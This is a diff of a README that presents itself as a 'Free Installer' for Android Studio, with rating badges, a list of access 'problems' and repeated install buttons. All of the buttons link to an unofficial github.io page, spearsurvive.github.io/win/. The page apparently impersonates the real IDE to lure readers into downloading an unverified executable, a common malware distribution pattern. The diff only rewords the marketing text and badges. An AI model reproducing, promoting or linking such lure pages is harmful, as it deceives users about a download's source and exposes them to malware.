@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-IDE-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-Android+IDE-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Android Studio Free Installer** — Android Studio is Google's official free IDE for Android app development, built on IntelliJ IDEA. Works without internet access, no account required. Full offline installation.
+**💻 Android Studio Free Installer** — Android Studio is the official IDE for Android app development, based on IntelliJ IDEA. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Android Studio](https://img.shields.io/badge/⬇_Install_Android%20Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Android Studio](https://img.shields.io/badge/⬇_Install_Android+Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Android Studio
 
-Android Studio is Google's official free IDE for Android app development, built on IntelliJ IDEA. It provides an Android emulator, layout editor, APK analyzer, and all tools needed for building, testing, and publishing Android applications.
+Android Studio is the official IDE for Android app development, based on IntelliJ IDEA. Features include an intelligent code editor, a visual layout editor, an Android Emulator, performance profiling, and Gradle-based build system. Android Studio supports Kotlin, Java, and C/C++ for native development. As Google's official tool, it receives continuous updates aligned with new Android platform features.
 
 ---
 
 ## ❌ Problem: Android Studio is hard to access
 
-- **Resource Intensive** — High memory and CPU requirements; slow on older hardware
-- **Android Only** — Cannot build iOS apps; Flutter support added but iOS deployment needs Xcode
-- **Complex Gradle** — Gradle build system configuration is complex and can be frustrating
-- **Emulator Performance** — Android emulator requires hardware virtualization and consumes significant resources
+- **Resource Demands** — Very high RAM and CPU requirements; emulator particularly demanding
+- **Startup Time** — Slow startup and indexing, especially on first launch
+- **Disk Space** — Large installation including SDK components requires significant storage
+- **Emulator Performance** — Android emulator performance varies significantly by hardware
 
 ---
 
@@ -81,7 +81,7 @@ Android Studio is Google's official free IDE for Android app development, built 
 
 <div align="center">
 
-[![⬇ Install Android Studio](https://img.shields.io/badge/⬇_Install_Android%20Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Android Studio](https://img.shields.io/badge/⬇_Install_Android+Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Android Studio is Google's official free IDE for Android app development, built 
 
 ---
 
-**Android Studio Free Installer** — Android Studio is Google's official free IDE for Android app development, built on IntelliJ IDEA. Install without internet connection today!
+**Android Studio Free Installer** — Android Studio is the official IDE for Android app development, based on IntelliJ IDEA. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Android Studio](https://img.shields.io/badge/⬇_Install_Android%20Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Android Studio](https://img.shields.io/badge/⬇_Install_Android+Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
